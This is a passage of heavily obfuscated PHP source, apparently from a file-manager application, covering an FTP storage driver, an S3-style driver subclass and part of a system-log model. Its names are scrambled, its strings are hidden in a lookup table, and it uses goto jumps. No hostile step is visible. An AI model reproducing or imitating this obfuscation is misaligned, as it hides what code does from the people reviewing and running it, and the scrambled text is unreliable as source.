isset($©À¹ÁĞ[$­µ×è—³[207]]) && $©À¹ÁĞ[$­µ×è—³[207]] == $­µ×è—³[1451] ? !0 : !1; $this->scheme = $ıë¼©Ê— ? $­µ×è—³[1452] : $­µ×è—³[1453]; $this->port = isset($©À¹ÁĞ[$­µ×è—³[209]]) ? $©À¹ÁĞ[$­µ×è—³[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($­µ×è—³[1454]) . $this->host . $­µ×è—³[4] . $this->port, !0); return !1; } $ìü¾Û¿ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ìü¾Û¿) { $this->writeLog(LNG($­µ×è—³[1455]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $’áñŞğó = $this->pasv == $­µ×è—³[91] ? !0 : !1; @ftp_pasv($this->connect, $’áñŞğó); $íï„ª¤[$‘Øş¼§…] = array($­µ×è—³[1456] => $this->connect, $­µ×è—³[208] => $this->host, $­µ×è—³[207] => $this->scheme, $­µ×è—³[209] => $this->port); return $ìü¾Û¿; } private function _isconn($ş°”£ÓŞ = true) { if (is_resource($this->connect)) { return !0; } if (!$ş°”£ÓŞ) { return !1; } return $this->_login($this->config); } public function mkfile($Ò„†Ûªı, $Ñ„¢‰äÖ = '', $Åã îø¦ = REPEAT_RENAME) { if ($this->setContent($Ò„†Ûªı, $Ñ„¢‰äÖ)) { return $this->getPathOuter($Ò„†Ûªı); } $this->writeLog(LNG($_SERVER[²Ö÷öõ][1457]), !0); return !1; } public function mkdir($õğªæÖ¹, $áµŞõõã = REPEAT_SKIP) { $ë®Æ°¸æ =& $_SERVER[²Ö÷öõ]; if (!$õğªæÖ¹ || $õğªæÖ¹ == $ë®Æ°¸æ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $õğªæÖ¹ = $this->iconvSystem($õğªæÖ¹); if ($this->_isFolder($õğªæÖ¹) || @ftp_mkdir($this->connect, $õğªæÖ¹)) { return $this->getPathOuter($õğªæÖ¹); } if (!$this->mkdir($this->pathFather($õğªæÖ¹))) { return !1; } if ($õğªæÖ¹ = @ftp_mkdir($this->connect, $õğªæÖ¹)) { return $this->getPathOuter($õğªæÖ¹); } $this->writeLog(__FUNCTION__ . $ë®Æ°¸æ[1458], !0); return !1; } public function copyFile($ç§ƒŞÌ², $¼ä¡™ı²) { if (!$this->_isconn()) { return !1; } $ ˆÕ„œ» = $this->pathThis($this->iconvSystem($ç§ƒŞÌ²)); $¡íÏ×Î = $this->tempFile($ ˆÕ„œ»); $¬®±ÌÄà = $this->iconvApp($¡íÏ×Î); $this->download($ç§ƒŞÌ², $¬®±ÌÄà); $æÄ§¡„ = $this->upload($¼ä¡™ı², $¬®±ÌÄà); $this->tempFileRemve($¡íÏ×Î); return $æÄ§¡„; } public function moveFile($ÆèıŠâ–, $Ùö ˆü„) { if (!$this->_isconn()) { return !1; } $ÆèıŠâ– = $this->iconvSystem($ÆèıŠâ–); $Ùö ˆü„ = $this->iconvSystem($Ùö ˆü„); $›Û£ğ…ñ = @ftp_rename($this->connect, $ÆèıŠâ–, $Ùö ˆü„); if (!$›Û£ğ…ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); return !1; } return $this->getPathOuter($Ùö ˆü„); } public function delFile($ıá’Ê”¾) { if (!$this->_isconn()) { return !1; } $ıá’Ê”¾ = $this->iconvSystem($ıá’Ê”¾); $ÉÙŒÍ—† = @ftp_delete($this->connect, $ıá’Ê”¾); if (!$ÉÙŒÍ—†) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); } return $ÉÙŒÍ—†; } public function delFolder($¦ı’õ’º) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Œ“·Ì«ã = $º·“×õª = array(); $this->fileList($¦ı’õ’º, $Œ“·Ì«ã, $º·“×õª, !0); $this->listItemCache = !0; foreach ($º·“×õª as $üÉŞĞŸÙ) { $ÌÙƒ…åã = $this->iconvSystem($üÉŞĞŸÙ[$_SERVER[²Ö÷öõ][32]]); $Ô…¼¼¹é = @ftp_delete($this->connect, $ÌÙƒ…åã); if (!$Ô…¼¼¹é) { return !1; } } foreach ($Œ“·Ì«ã as $ÌÙƒ…åã) { $ÌÙƒ…åã = $this->iconvSystem($ÌÙƒ…åã); $Ô…¼¼¹é = @ftp_rmdir($this->connect, $ÌÙƒ…åã); if (!$Ô…¼¼¹é) { return !1; } } $¦ı’õ’º = $this->iconvSystem($¦ı’õ’º); return @ftp_rmdir($this->connect, $¦ı’õ’º); } public function rename($°à¢‰ï , $™«Àé¯´) { $§»õ»·ù =& $_SERVER[²Ö÷öõ]; if (!$this->_isconn()) { return !1; } $ºİíòÖÃ = $this->fileNameAuto($this->pathFather($°à¢‰ï ), $™«Àé¯´); $ºİíòÖÃ = $this->iconvSystem($ºİíòÖÃ); $°à¢‰ï  = $this->iconvSystem($°à¢‰ï ); $İ¹ğ¹–Ô = $this->pathFather($°à¢‰ï ); $ÖÖô¢Ûî = rtrim($İ¹ğ¹–Ô, $§»õ»·ù[8]) . $§»õ»·ù[8] . $ºİíòÖÃ; $üÖäıïŞ = @ftp_rename($this->connect, $°à¢‰ï , $ÖÖô¢Ûî); if (!$üÖäıïŞ) { $this->writeLog(__FUNCTION__ . $§»õ»·ù[1458], !0); return !1; } $ÖÖô¢Ûî = $this->iconvApp($ÖÖô¢Ûî); return $this->getPathOuter($ÖÖô¢Ûî); } private function folderInfo($˜ÀÜÉ×, $ø·æò”ì = false) { $õ‡»À×„ =& $_SERVER[²Ö÷öõ]; $øå…Ôë = array($õ‡»À×„[32] => $this->pathThis($˜ÀÜÉ×), $õ‡»À×„[87] => $this->getPathOuter($õ‡»À×„[8] . $˜ÀÜÉ×), $õ‡»À×„[33] => $õ‡»À×„[78]); if ($ø·æò”ì) { return $øå…Ôë; } $øå…Ôë[$õ‡»À×„[231]] = $øå…Ôë[$õ‡»À×„[88]] = 0; $øå…Ôë[$õ‡»À×„[232]] = $øå…Ôë[$õ‡»À×„[233]] = !0; return $øå…Ôë; } private function fileInfo($„ÅŞ²‰, $àä«à‘Û = false, $²©÷¨ˆˆ = array()) { $–°Óå¶é =& $_SERVER[²Ö÷öõ]; $Ğ°—³»Ó = array($–°Óå¶é[32] => $this->pathThis($„ÅŞ²‰), $–°Óå¶é[87] => $this->getPathOuter($–°Óå¶é[8] . $„ÅŞ²‰), $–°Óå¶é[33] => $–°Óå¶é[230], $–°Óå¶é[79] => isset($²©÷¨ˆˆ[$–°Óå¶é[79]]) ? $²©÷¨ˆˆ[$–°Óå¶é[79]] : 0, $–°Óå¶é[169] => $this->ext($„ÅŞ²‰)); if ($àä«à‘Û) { return $Ğ°—³»Ó; } $Ğ°—³»Ó[$–°Óå¶é[231]] = $Ğ°—³»Ó[$–°Óå¶é[88]] = 0; $Ğ°—³»Ó[$–°Óå¶é[232]] = $Ğ°—³»Ó[$–°Óå¶é[233]] = !0; $±öñŠŞ‘ = $this->iconvSystem($„ÅŞ²‰); $Ğ°—³»Ó[$–°Óå¶é[88]] = @ftp_mdtm($this->connect, $±öñŠŞ‘); if (empty($²©÷¨ˆˆ)) { $²©÷¨ˆˆ = $this->objectMeta($„ÅŞ²‰); if (!$²©÷¨ˆˆ) { return $Ğ°—³»Ó; } } $Ğ°—³»Ó[$–°Óå¶é[79]] = $²©÷¨ˆˆ[$–°Óå¶é[79]]; return $Ğ°—³»Ó; } public function size($‡Š¾†Á ) { $…æë›¾ = $this->objectMeta($‡Š¾†Á ); return $…æë›¾ ? $…æë›¾[$_SERVER[²Ö÷öõ][79]] : 0; } public function info($ÀÓÄ’‹) { if ($this->isFile($ÀÓÄ’‹)) { return $this->fileInfo($ÀÓÄ’‹, 0); } else { if ($this->isFolder($ÀÓÄ’‹)) { return $this->folderInfo($ÀÓÄ’‹); } } return !1; } private function fileList($«†ß±Ò, &$¾Ÿ¼¸­ø, &$·Ô÷ñ­…, $è¤¤ø‹ = false) { $ÁûÊŸ¥¾ =& $_SERVER[²Ö÷öõ]; $«†ß±Ò = $this->iconvSystem($«†ß±Ò); if (!$this->isFolder($«†ß±Ò)) { return !1; } @ftp_chdir($this->connect, $ÁûÊŸ¥¾[8]); $«†ß±Ò = rtrim($«†ß±Ò, $ÁûÊŸ¥¾[8]) . $ÁûÊŸ¥¾[8]; check_abort(); $—ëçÂš = @ftp_rawlist($this->connect, $«†ß±Ò); if (!$—ëçÂš) { $—ëçÂš = array(); } $Å÷’İÜ¾ = array($ÁûÊŸ¥¾[10] => 1, $ÁûÊŸ¥¾[1373] => 1); foreach ($—ëçÂš as $ß‡„Âî²) { $à¨Õ×í³ = $this->_listItem($ß‡„Âî²); if ($à¨Õ×í³[0] == $ÁûÊŸ¥¾[841]) { continue; } $±ÉÌ™¼Œ = $à¨Õ×í³[8]; if (empty($±ÉÌ™¼Œ) && $±ÉÌ™¼Œ !== $ÁûÊŸ¥¾[228] || isset($Å÷’İÜ¾[$±ÉÌ™¼Œ])) { continue; } $±ÉÌ™¼Œ = $this->iconvApp($«†ß±Ò . ltrim($±ÉÌ™¼Œ, $ÁûÊŸ¥¾[8])); $è¥ ËÙì = array($ÁûÊŸ¥¾[32] => $±ÉÌ™¼Œ, $ÁûÊŸ¥¾[33] => $ÁûÊŸ¥¾[230], $ÁûÊŸ¥¾[79] => $à¨Õ×í³[4]); if (substr($ß‡„Âî², 0, 1) == $ÁûÊŸ¥¾[1459]) { $è¥ ËÙì[$ÁûÊŸ¥¾[33]] = $ÁûÊŸ¥¾[78]; $è¥ ËÙì[$ÁûÊŸ¥¾[79]] = 0; } $™©Ùß…® = $è¥ ËÙì[$ÁûÊŸ¥¾[33]] == $ÁûÊŸ¥¾[78] ? !0 : !1; $this->cacheMethodInfoSet($±ÉÌ™¼Œ, $™©Ùß…®, $è¥ ËÙì); if ($™©Ùß…®) { $¾Ÿ¼¸­ø[] = $±ÉÌ™¼Œ; if ($è¤¤ø‹) { $this->fileList($±ÉÌ™¼Œ, $¾Ÿ¼¸­ø, $·Ô÷ñ­…, $è¤¤ø‹); } continue; } $·Ô÷ñ­…[] = $è¥ ËÙì; } $this->cacheMethodInfoSet($«†ß±Ò, !0); } private function _listItem($Ù¢Í¡Áù) { if (empty($Ù¢Í¡Áù)) { return array(); } $³úÃ¸º€ = preg_split($_SERVER[²Ö÷öõ][1460], $Ù¢Í¡Áù); if (count($³úÃ¸º€) <= 9) { return $³úÃ¸º€; } $³úÃ¸º€[8] = trim(substr($Ù¢Í¡Áù, strpos($Ù¢Í¡Áù, $³úÃ¸º€[7]) + strlen($³úÃ¸º€[7]))); return array_splice($³úÃ¸º€, 0, 9); } public function listPath($â¶ÛÙøö, $÷ÎÃ¦ÃÀ = false) { $ùãË•¯ì =& $_SERVER[²Ö÷öõ]; if (!$this->_isconn()) { return !1; } $«´ŸÓœÕ = $ßµøÉ§Ê = array(); $this->fileList($â¶ÛÙøö, $«´ŸÓœÕ, $ßµøÉ§Ê); foreach ($«´ŸÓœÕ as $¡×ÖÁúõ => $¦œÃ–Ç€) { $«´ŸÓœÕ[$¡×ÖÁúõ] = $this->folderInfo($¦œÃ–Ç€, $÷ÎÃ¦ÃÀ); } foreach ($ßµøÉ§Ê as $¡×ÖÁúõ => $¦œÃ–Ç€) { $ßµøÉ§Ê[$¡×ÖÁúõ] = $this->fileInfo($¦œÃ–Ç€[$ùãË•¯ì[32]], $÷ÎÃ¦ÃÀ, $¦œÃ–Ç€); } return array($ùãË•¯ì[85] => $«´ŸÓœÕ, $ùãË•¯ì[86] => $ßµøÉ§Ê); } public function has($Ñ§§¼ˆ, $±…íÚ¬ = false, $ÕˆÍ•Ù“ = true) { $ûÜŠİÓ =& $_SERVER[²Ö÷öõ]; $İÍš²Ä = $Ú•šïì» = array(); $Ë×‚›Éï = $±…íÚ¬ ? !0 : !1; $this->fileList($Ñ§§¼ˆ, $İÍš²Ä, $Ú•šïì», $Ë×‚›Éï); if ($±…íÚ¬) { return array($ûÜŠİÓ[239] => count($Ú•šïì»), $ûÜŠİÓ[240] => count($İÍš²Ä)); } if ($ÕˆÍ•Ù“) { if (count($Ú•šïì»)) { return !0; } } else { if (count($İÍš²Ä)) { return !0; } } return !1; } public function listAll($•é£â€) { $÷ËÒöîÂ =& $_SERVER[²Ö÷öõ]; if (!$this->_isconn()) { return !1; } $ç†’ÒÊ¤ = $ÙÃşíëê = array(); $this->fileList($•é£â€, $ç†’ÒÊ¤, $ÙÃşíëê, !0); $‡Á”ÅİĞ = array_to_keyvalue($ÙÃşíëê, $÷ËÒöîÂ[32]); foreach ($ç†’ÒÊ¤ as $½§¯æÛ¤) { if (is_string($½§¯æÛ¤)) { $‡Á”ÅİĞ[$½§¯æÛ¤] = array($÷ËÒöîÂ[79] => 0); } } return $this->listAllFiles($•é£â€, $‡Á”ÅİĞ); } public function getContent($ç÷øåßß) { if (!$this->_isconn()) { return !1; } $ç÷øåßß = $this->iconvSystem($ç÷øåßß); return $this->fileSubstr($ç÷øåßß); } public function setContent($Øæâ¥Üº, $¯ïØ÷›´ = '') { if (!$this->_isconn()) { return !1; } $«©şÛ—œ = $this->pathThis($this->iconvSystem($Øæâ¥Üº)); $Ù¬˜Ü” = $this->tempFile($«©şÛ—œ); file_put_contents($Ù¬˜Ü”, $¯ïØ÷›´); $¼‘ÄäòÛ = $this->upload($Øæâ¥Üº, $this->iconvApp($Ù¬˜Ü”)); $this->tempFileRemve($Ù¬˜Ü”); return $¼‘ÄäòÛ; } public function fileSubstr($ ‚àÉÏÚ, $ûÀˆ»Şİ = 0, $Ê©éŒø‹ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ ‚àÉÏÚ, $ûÀˆ»Şİ, $Ê©éŒø‹); } private function ftpRequest($ÌÍ¸º”¹, $³ˆ˜é = 0, $ØÚ–áÇÉ = false) { $ÌÍ¸º”¹ = $this->iconvSystem($ÌÍ¸º”¹); $Ú“ø¸ñµ = $this->scheme . $this->host . $_SERVER[²Ö÷öõ][4] . $this->port; $Ú¼™«ÌÇ = curl_init(); curl_setopt($Ú¼™«ÌÇ, CURLOPT_URL, $Ú“ø¸ñµ . $this->pathEncode($ÌÍ¸º”¹)); curl_setopt($Ú¼™«ÌÇ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ØÚ–áÇÉ) { $ÖÂÖÓıö = $³ˆ˜é + $ØÚ–áÇÉ - 1; curl_setopt($Ú¼™«ÌÇ, CURLOPT_RANGE, "{$³ˆ˜é}\55{$ÖÂÖÓıö}"); } curl_setopt($Ú¼™«ÌÇ, CURLOPT_RETURNTRANSFER, 1); $ºÆáÄÌ = curl_exec($Ú¼™«ÌÇ); curl_close($Ú¼™«ÌÇ); return $ºÆáÄÌ; } public function upload($â½ë”ûé, $³œºß, $ıéá¦Öã = false, $°Õ¡Ì†ì = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($â½ë”ûé))) { return !1; } $â½ë”ûé = $this->iconvSystem($â½ë”ûé); $³œºß = $this->iconvSystem($³œºß); $ã†öİ¨ = ftp_nb_put($this->connect, $â½ë”ûé, $³œºß, FTP_BINARY); while ($ã†öİ¨ == FTP_MOREDATA) { $ã†öİ¨ = ftp_nb_continue($this->connect); } if ($ã†öİ¨ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); return !1; } return $this->getPathOuter($â½ë”ûé); } public function download($¬ÜÉÂ¸†, $Û‘éñ×¸ = '') { if (!$this->_isconn()) { return !1; } $¹†´ş½¯ = $this->pathFather($Û‘éñ×¸); if (!IO::mkdir($¹†´ş½¯)) { return !1; } $¬ÜÉÂ¸† = $this->iconvSystem($¬ÜÉÂ¸†); $Û‘éñ×¸ = $this->iconvSystem($Û‘éñ×¸); $§Æ³şŒá = ftp_nb_get($this->connect, $Û‘éñ×¸, $¬ÜÉÂ¸†, FTP_BINARY); while ($§Æ³şŒá == FTP_MOREDATA) { $§Æ³şŒá = ftp_nb_continue($this->connect); } if ($§Æ³şŒá != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][1458], !0); return !1; } return $this->iconvApp($Û‘éñ×¸); } public function exist($å°ñ†£) { return $this->isFile($å°ñ†£) || $this->isFolder($å°ñ†£); } public function isFile($öğìÏç¢) { return !$this->isFolder($öğìÏç¢) && $this->objectMeta($öğìÏç¢); } public function isFolder($¬òïÛ) { return $this->cacheMethod($_SERVER[²Ö÷öõ][179], $¬òïÛ); } protected function objectMeta($ûªŒØõú) { return $this->cacheMethod($_SERVER[²Ö÷öõ][181], $ûªŒØõú); } protected function _objectMeta($Ä’È¤”¢) { $„ãÄ¢«Ç =& $_SERVER[²Ö÷öõ]; if ($Ä’È¤”¢ == $„ãÄ¢«Ç[12] || $Ä’È¤”¢ == $„ãÄ¢«Ç[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ä’È¤”¢ = $this->iconvSystem($Ä’È¤”¢); $Éã‚ŞªÏ = array($„ãÄ¢«Ç[32] => $this->iconvApp($Ä’È¤”¢), $„ãÄ¢«Ç[33] => $„ãÄ¢«Ç[230], $„ãÄ¢«Ç[79] => 0); @ftp_chdir($this->connect, $„ãÄ¢«Ç[8]); $ğˆÕİÂê = @ftp_size($this->connect, $Ä’È¤”¢); if ($ğˆÕİÂê != -1) { $Éã‚ŞªÏ[$„ãÄ¢«Ç[79]] = $ğˆÕİÂê; } else { $²åÂõ–© = @ftp_chdir($this->connect, $Ä’È¤”¢); if (!$²åÂõ–©) { return !1; } $Éã‚ŞªÏ[$„ãÄ¢«Ç[33]] = $„ãÄ¢«Ç[78]; } return $Éã‚ŞªÏ; } protected function _isFolder($†×‹ê¹) { $ÙÄ°ÈïÖ =& $_SERVER[²Ö÷öõ]; if ($†×‹ê¹ == $ÙÄ°ÈïÖ[12] || $†×‹ê¹ == $ÙÄ°ÈïÖ[8]) { return !0; } $ªæ‡ÅıŠ = $this->_objectMeta($†×‹ê¹); return isset($ªæ‡ÅıŠ[$ÙÄ°ÈïÖ[33]]) && $ªæ‡ÅıŠ[$ÙÄ°ÈïÖ[33]] == $ÙÄ°ÈïÖ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Ä¹Õöâ) { parent::__construct($Ä¹Õöâ); $this->setSignVersion($_SERVER[²Ö÷öõ][247]); } public function uploadLink($˜Ï´ç¨š, $”ûôÀ¡é = 0) { $æŠ™¨ª =& $_SERVER[²Ö÷öõ]; if ($this->isUploadServer()) { return; } $Šì´Î£º = $this->getType(); if (!in_array($Šì´Î£º, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Âƒóş‰¹ = (!$”ûôÀ¡é ? 1 : ceil($”ûôÀ¡é / pow(1024, 3))) * 3600 * 4; $ø¾ü¸ûÉ = $this->multiUploadFormData($˜Ï´ç¨š, $Âƒóş‰¹); if ($ø¾ü¸ûÉ) { $ø¾ü¸ûÉ[$æŠ™¨ª[97]] = $˜Ï´ç¨š; $ø¾ü¸ûÉ[$æŠ™¨ª[98]] = $Šì´Î£º; } return $ø¾ü¸ûÉ; } public function fileOutImage($£‘´Æ‰, $­Œ×ŒÚ½ = 250) { if ($this->size($£‘´Æ‰) > 1024 * 1024 * 25) { return $this->fileOutImageServer($£‘´Æ‰, $­Œ×ŒÚ½); } $”ûã¹éî = $this->link($£‘´Æ‰); $”ûã¹éî .= $_SERVER[²Ö÷öõ][1461] . $­Œ×ŒÚ½; $this->fileOutLink($”ûã¹éî); } public function fileOutLink($¸òõª®‹) { $Ô‹…’´ =& $_SERVER[²Ö÷öõ]; if (substr($¸òõª®‹, 0, 7) == $Ô‹…’´[313]) { $¸òõª®‹ = $Ô‹…’´[314] . substr($¸òõª®‹, 7); } header($Ô‹…’´[175] . $¸òõª®‹); die; } } goto DÅ§³á÷Íì; aòõ—ª¡Ùè: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\155\x5f\154\157\x67"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\151\155\145", "\164\x69\155\x65", "\x69\156\163\x65\162\x74", "\x66\165\156\x63\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÕÖÃìÁ– =& $_SERVER[²Ö÷öõ]; return array($ÕÖÃìÁ–[2340] => LNG($ÕÖÃìÁ–[2341]), $ÕÖÃìÁ–[2342] => LNG($ÕÖÃìÁ–[2343]), $ÕÖÃìÁ–[1922] => LNG($ÕÖÃìÁ–[2344]), $ÕÖÃìÁ–[2345] => LNG($ÕÖÃìÁ–[2346]), $ÕÖÃìÁ–[2347] => LNG($ÕÖÃìÁ–[2348]), $ÕÖÃìÁ–[2349] => LNG($ÕÖÃìÁ–[2350]), $ÕÖÃìÁ–[2351] => LNG($ÕÖÃìÁ–[2352]), $ÕÖÃìÁ–[1952] => LNG($ÕÖÃìÁ–[2352]), $ÕÖÃìÁ–[1953] => LNG($ÕÖÃìÁ–[2353]), $ÕÖÃìÁ–[2354] => LNG($ÕÖÃìÁ–[2355]), $ÕÖÃìÁ–[2356] => LNG($ÕÖÃìÁ–[2357]), $ÕÖÃìÁ–[2358] => LNG($ÕÖÃìÁ–[2359]), $ÕÖÃìÁ–[2360] => LNG($ÕÖÃìÁ–[2361]), $ÕÖÃìÁ–[1950] => LNG($ÕÖÃìÁ–[2362]), $ÕÖÃìÁ–[2363] => LNG($ÕÖÃìÁ–[2364]), $ÕÖÃìÁ–[1957] => LNG($ÕÖÃìÁ–[2365]), $ÕÖÃìÁ–[2366] => LNG($ÕÖÃìÁ–[2367]), $ÕÖÃìÁ–[2368] => LNG($ÕÖÃìÁ–[2369]), $ÕÖÃìÁ–[2370] => LNG($ÕÖÃìÁ–[2371]), $ÕÖÃìÁ–[2372] => LNG($ÕÖÃìÁ–[2373]), $ÕÖÃìÁ–[1960] => LNG($ÕÖÃìÁ–[2374]), $ÕÖÃìÁ–[1961] => LNG($ÕÖÃìÁ–[2375]), $ÕÖÃìÁ–[2376] => LNG($ÕÖÃìÁ–[2377]), $ÕÖÃìÁ–[2378] => LNG($ÕÖÃìÁ–[2379]), $ÕÖÃìÁ–[2380] => LNG($ÕÖÃìÁ–[2381]), $ÕÖÃìÁ–[1955] => LNG($ÕÖÃìÁ–[2382]), $ÕÖÃìÁ–[2383] => LNG($ÕÖÃìÁ–[2384]), $ÕÖÃìÁ–[1954] => LNG($ÕÖÃìÁ–[2385]), $ÕÖÃìÁ–[2386] => LNG($ÕÖÃìÁ–[2387]), $ÕÖÃìÁ–[2388] => LNG($ÕÖÃìÁ–[2389]), $ÕÖÃìÁ–[2390] => LNG($ÕÖÃìÁ–[2389]), $ÕÖÃìÁ–[2391] => LNG($ÕÖÃìÁ–[2392]), $ÕÖÃìÁ–[2393] => LNG($ÕÖÃìÁ–[2393]), $ÕÖÃìÁ–[2394] => LNG($ÕÖÃìÁ–[1926]), $ÕÖÃìÁ–[2395] => LNG($ÕÖÃìÁ–[2396]), $ÕÖÃìÁ–[2397] => LNG($ÕÖÃìÁ–[2398]), $ÕÖÃìÁ–[2399] => LNG($ÕÖÃìÁ–[2400]), $ÕÖÃìÁ–[2401] => LNG($ÕÖÃìÁ–[2402]), $ÕÖÃìÁ–[2403] => LNG($ÕÖÃìÁ–[2404]), $ÕÖÃìÁ–[2405] => LNG($ÕÖÃìÁ–[2405]), $ÕÖÃìÁ–[2406] => LNG($ÕÖÃìÁ–[2407]), $ÕÖÃìÁ–[2408] => LNG($ÕÖÃìÁ–[2409]), $ÕÖÃìÁ–[2410] => LNG($ÕÖÃìÁ–[2411]), $ÕÖÃìÁ–[2412] => LNG($ÕÖÃìÁ–[2413]), $ÕÖÃìÁ–[2414] => LNG($ÕÖÃìÁ–[2415]), $ÕÖÃìÁ–[2416] => LNG($ÕÖÃìÁ–[2417]), $ÕÖÃìÁ–[212] => LNG($ÕÖÃìÁ–[212]), $ÕÖÃìÁ–[213] => LNG($ÕÖÃìÁ–[2418]), $ÕÖÃìÁ–[2419] => LNG($ÕÖÃìÁ–[2419])); } private function typeFile() { $±Î’š¥Î =& $_SERVER[²Ö÷öõ]; $Šñ÷È® = array($±Î’š¥Î[1957] => array($±Î’š¥Î[1958]), $±Î’š¥Î[2358] => array($±Î’š¥Î[2420]), $±Î’š¥Î[2360] => array($±Î’š¥Î[2421]), $±Î’š¥Î[1950] => array($±Î’š¥Î[1951], $±Î’š¥Î[2422]), $±Î’š¥Î[2368] => array(), $±Î’š¥Î[2370] => array(), $±Î’š¥Î[2372] => array(), $±Î’š¥Î[1960] => array($±Î’š¥Î[1962]), $±Î’š¥Î[1961] => array($±Î’š¥Î[1962]), $±Î’š¥Î[2376] => array($±Î’š¥Î[2423]), $±Î’š¥Î[2378] => array($±Î’š¥Î[2423]), $±Î’š¥Î[2380] => array($±Î’š¥Î[2424]), $±Î’š¥Î[2366] => array($±Î’š¥Î[2425]), $±Î’š¥Î[1955] => array($±Î’š¥Î[2426]), $±Î’š¥Î[2383] => array($±Î’š¥Î[2427]), $±Î’š¥Î[1954] => array($±Î’š¥Î[1956])); return $Šñ÷È®; } private function typeAll() { $„ÂÒ¥–ñ =& $_SERVER[²Ö÷öõ]; $ç—òß– = $this->typeList; $Ë¾ÎËìê = array_filter($this->typeFile()); foreach ($Ë¾ÎËìê as $Ú•¹õ×¹ => $¯”’Ò›Ğ) { $ç—òß–[$¯”’Ò›Ğ[0]] = $ç—òß–[$Ú•¹õ×¹]; } $ç—òß–[$„ÂÒ¥–ñ[1962]] = LNG($„ÂÒ¥–ñ[2428]); $ç—òß–[$„ÂÒ¥–ñ[2423]] = LNG($„ÂÒ¥–ñ[2429]); return $ç—òß–; } public function addLog($Ç™†Å“Â, $õ–Šàâ = array()) { $´ŠÉ¿Ø™ =& $_SERVER[²Ö÷öõ]; if (!isset($this->typeList[$Ç™†Å“Â])) { return; } $±ÛúØ–ª = Session::get($´ŠÉ¿Ø™[2121]); if (!$±ÛúØ–ª) { $±ÛúØ–ª = _get($õ–Šàâ, $´ŠÉ¿Ø™[1780], 0); } if ($Ç™†Å“Â == $´ŠÉ¿Ø™[2395] && is_array($õ–Šàâ[$´ŠÉ¿Ø™[2430]]) && !$õ–Šàâ[$´ŠÉ¿Ø™[2430]]) { return; } $ö‚ä€Ëı = get_client_ip(); if (!$õ–Šàâ || strlen(json_encode($õ–Šàâ)) >= 1024 * 64) { if ($õ–Šàâ && is_array($õ–Šàâ)) { $õ–Šàâ = array_intersect_key($õ–Šàâ, array_flip($´ŠÉ¿Ø™[475], $´ŠÉ¿Ø™[32])); $õ–Šàâ[$´ŠÉ¿Ø™[2431]] = $ö‚ä€Ëı; } else { $õ–Šàâ = array($´ŠÉ¿Ø™[2431] => $ö‚ä€Ëı); } } else { if (is_array($õ–Šàâ)) { $õ–Šàâ[$´ŠÉ¿Ø™[2431]] = $ö‚ä€Ëı; } else { $õ–Šàâ = array($´ŠÉ¿Ø™[1295] => $õ–Šàâ, $´ŠÉ¿Ø™[2431] => $ö‚ä€Ëı); } } $õ–Šàâ = array($´ŠÉ¿Ø™[1770] => Session::sign(), $´ŠÉ¿Ø™[1771] => intval($±ÛúØ–ª), $´ŠÉ¿Ø™[33] => $Ç™†Å“Â, $´ŠÉ¿Ø™[1773] => json_encode($õ–Šàâ)); parent::add($õ–Šàâ); } public function remove($´ş’Œû) { $this->where(array($_SERVER[²Ö÷öõ][493] => $´ş’Œû))->delete(); } private function _makeOrder($´÷ŸíÑ = '') { $Øßæ„¡ =& $_SERVER[²Ö÷öõ]; $İÆ‚Ÿ¡ = $Øßæ„¡[231]; $¢ÕæØãû = array($Øßæ„¡[523] => $Øßæ„¡[524], $Øßæ„¡[525] => $Øßæ„¡[526]); $µ”Ï† = Input::get($Øßæ„¡[531], $Øßæ„¡[7], $Øßæ„¡[2157], array($Øßæ„¡[2075], $Øßæ„¡[525])); $µ”Ï† = $¢ÕæØãû[$µ”Ï†]; $´÷ŸíÑ = $´÷ŸíÑ . "{$İÆ‚Ÿ¡}\40{$µ”Ï†}"; return $this->order($´÷ŸíÑ); } public function get($®è¤ÙÑø = '') { $Õø—ş‘Í =& $_SERVER[²Ö÷öõ]; if (!$®è¤ÙÑø) { show_json(array()); } $ºôæá‰İ = array(); if ($®è¤ÙÑø[$Õø—ş‘Í[1780]]) { $ºôæá‰İ[$Õø—ş‘Í[1780]] = $®è¤ÙÑø[$Õø—ş‘Í[1780]]; } if (isset($®è¤ÙÑø[$Õø—ş‘Í[843]])) { $å›æ”Á = $®è¤ÙÑø[$Õø—ş‘Í[843]]; $Ğ¿œàŞÕ = isset($®è¤ÙÑø[$Õø—ş‘Í[844]]) ? $®è¤ÙÑø[$Õø—ş‘Í[844]] : time(); $ºôæá‰İ[$Õø—ş‘Í[231]] = array($Õø—ş‘Í[409], array($å›æ”Á, $Ğ¿œàŞÕ)); } if ($®è¤ÙÑø[$Õø—ş‘Í[33]]) { $Éò¦Ùô‡ = explode($Õø—ş‘Í[50], $®è¤ÙÑø[$Õø—ş‘Í[33]]); $§æİÎ = $this->typeFile(); $¾úıªÆ• = array(); foreach ($Éò¦Ùô‡ as $Ó©åôŞ) { $¾úıªÆ•[] = $Ó©åôŞ; if (isset($§æİÎ[$Ó©åôŞ])) { $¾úıªÆ• = array_merge($¾úıªÆ•, $§æİÎ[$Ó©åôŞ]); } } $¾úıªÆ• = array_unique($¾úıªÆ•); if ($¾úıªÆ•) { $ºôæá‰İ[$Õø—ş‘Í[33]] = array($Õø—ş‘Í[7], $¾úıªÆ•); } } else { 